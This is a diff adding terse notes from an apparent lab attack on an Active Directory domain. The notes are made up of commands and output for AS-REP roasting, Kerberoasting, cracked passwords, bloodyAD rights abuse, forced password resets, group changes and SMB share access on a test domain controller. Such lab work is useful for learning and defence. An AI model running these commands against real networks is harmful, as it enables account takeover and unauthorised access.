@@ -1,0 +1,44 @@
+info@itamae.se
+
+impacket-GetNPUsers horrorland.local/OMAR.RASHED -dc-ip 192.168.56.102 -no-pass -request -format john -outputfile crackme.txt
+
+
+$krb5asrep$OMAR.RASHED@HORRORLAND.LOCAL:7efa6371dcb4bb231f291bf9cfc29c15$396ece1eb4414d24b40725d586ae69391a17ac1fd5a883244c93603da3b67dbdf011d5398299a381f0d5fbe863af4f3f420d986d29ad0c6916719ba3fb4eb82123e372955dd63116d2134efa037016c991aef79a0378d0300ddc7d9ddaa7b822d13716660ef1278e60ff88b434ef75ee4eff7b2603f8a0af10e8ffb56ef06997d738b1de019559dc248a468306f1644e387a0f0d3b3095b806d01be1747e1b0b3dedb6b9dbf6958c58145e61c48e94b5d28a9d730b1af2a9c1e3598df1a17876b93fc709f773d1681b847e08fc0650d9c829b9d66a4a981a308e838947e0bfc45e757f8d342fbbb6b31d27b8dab4ea3d97e5f501
+
+
+P@ssw0rd         ($krb5asrep$OMAR.RASHED@HORRORLAND.LOCAL)
+
+python3 targetedKerberoast.py -v -d 'horrorland.local' -u 'OMAR.FADEL' -p 'P@ssw0rd'
+
+$krb5tgs$23$*mohamed.mahmoud$HORRORLAND.LOCAL$horrorland.local/mohamed.mahmoud*$9d7ccda46556f552a976cc64adbb78c2$e0583b2f265f50f9ca54a077f246a02a7ba261d488e4b56244b2ace4951a20634a053ca9ef3674279405a221dd3d6d8aa980885ab1a6e88e861dd937dfe6988f67bcca9f5bb0a8ef9457ac85a767b875377b55c7aadac5cd94518ea1ae2fee9be573445ffc1ff03e5bb9e6912ce12ba2da15019faf715c3268eed591224dcfa9cc84fbedabf2d3bf920095c783afada21d20b50d3e87863e8e7146d47d9b5f5f8f5bb12ccaaad41cd98ffeec89e99f5ee4b490465e229c3b8762d1109cb3b1a530b480a6ac1a219b0464d47773d6a0620614169639e85c1d24bd84814e87f2b812106a1268a5b57c607e7f9e1f522fb7602b2b03eadcd7aa63e1e8ae8278e1378f67a5fda14a01624c3a86ed378bca072a0311f1f155840fe410ede22034c2dcac39dc1f8debd219ecea8871fd9583c3b63d55741934c4a3ee68c515c07cc126803c9fa2ed13db9776dd7e103eb5e318d7065924e4a1e9dd08bb9da0bcf196486662735fa04a4a3db6c1e0567707bbdefe90162ca03eb3119c8046be3eb4d82f7a025a017981b66030da1a1ed5ee06c3778f02ed9e64f1806164028b146de1935d89ea9d34bf785a7e2348dc45d9eb8178667edabf762fe8e937478444722dadbc63858e8fa714de43485181ddf93f7cfa45d2fa11e0dec790618bb5e5a77092f6fefea3d4b217330e7f464fa6c3db33b699f3426d80adef0ccd437c2942b8edaad00dbdaf3a0379252f979163fa68aff46fe7ac3f908ecc000e0fb5567f88d0aef7daf65f6e047570080fb0bf95c4454c55b777251a280fbc690f8c0568084cbfc88deac586edf4a474d952bca14927809f589521e8f46b03d8d3d166721a584eb9b273a9cd6d02bfa7b6d194eea30e389b61b605c39e3dc353ba0407248b676a26ee02e7f0c3901d8dcd41e9d1b12d1f371c88d8edccf29715ee2892ad0ccd84318b2ede03a7c0090581c0d63b3550eb930e4a638d31266231eca478bacc906324da0b0e7cc10978591e884ff4c0563c18585823fb3a85ffc988b52548ae53bdf97651d9e204b513be2045172c7a1c5ba35502d69914a25f0dfb70528f4f3166a05d7fb2b73133b09ed030c3de3fb51eea7f0fbd9e6cb4746621c9344f8bb993d327f2d4881dd126cf0631ee6f3d09c4ec75b6623d7c18d4e9e83252115cf3f125a310142c693060f5c9529165d07f8e373c3b799c47f0ec3105eb4600682a6fe26aa34e14b47720aa412ca14c7ccba99b956bcdb74cb1a7720babd9adbe7cec77ad485ad1548cb536c3f561c666920e8a32db03084ef2fae51c042705e2b5d379de0a484d736a5f1a78230af819781900cdf954c05f6a29ab3e6f26082459404b42ab6a5f8917b7aee0de727e1efa7a18c4a0bc330ab19452fcb191735ea8b85d54eb02183ca174face6265c9bc0e5b192693d740e4cc70b3322e9756e0ece5b6a698de28b698e7f560fee9a29e33c3970de367df02abc277d2e1833460c9e023bf
+
+n04g3t2getMyp@ss (?)
+
+➜  AD bloodyAD --host 192.168.56.102 -d horrorland.local -u mohamed.mahmoud -p 'n04g3t2getMyp@ss' add genericAll youssef.elsheikh mohamed.mahmoud
+[+] mohamed.mahmoud has now GenericAll on youssef.elsheikh
+➜  AD bloodyAD --host 192.168.56.102 -d horrorland.local -u mohamed.mahmoud -p 'n04g3t2getMyp@ss' set password youssef.elsheikh 'HackedPass123!'
+[+] Password changed successfully!
+➜  AD bloodyAD --host 192.168.56.102 -d horrorland.local -u youssef.elsheikh -p 'HackedPass123!' add groupMember "MOBILE DEVELOPERS" youssef.elsheikh
+[+] youssef.elsheikh added to MOBILE DEVELOPERS
+
+
+netexec smb 192.168.56.102 -u youssef.elsheikh -p 'HackedPass123!' --shares
+
+smbclient //192.168.56.102/"Mobile Developers" -U youssef.elsheikh%HackedPass123!
+
+
+(myenv) ➜  AD python3 crack.py
+
+[+] User:      horrorland\ahmed.gamal
+[+] Password:  VeryImposibleP@ssw0rdtoCrack
+
+AD netexec smb 192.168.56.102 -u MOHAMED.ABDELSATAR -p 'VerySecureP@ssw0rd!@#$'
+
+
+(myenv) ➜  AD bloodyAD --host 192.168.56.102 -d horrorland.local -u MOHAMED.ABDELSATAR -p 'VerySecureP@ssw0rd!@#$' add genericAll RAMEZ.SABER MOHAMED.ABDELSATAR
+[+] MOHAMED.ABDELSATAR has now GenericAll on RAMEZ.SABER
+(myenv) ➜  AD bloodyAD --host 192.168.56.102 -d horrorland.local -u MOHAMED.ABDELSATAR -p 'VerySecureP@ssw0rd!@#$' set password RAMEZ.SABER 'HackedPass123!'
+[+] Password changed successfully!
+(myenv) ➜  AD netexec smb 192.168.56.102 -u RAMEZ.SABER -p 'HackedPass123!'
+SMB         192.168.56.102  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:horrorland.local) (signing:True) (SMBv1:False)
+SMB         192.168.56.102  445    DC               [+] horrorland.local\RAMEZ.SABER:HackedPass123!
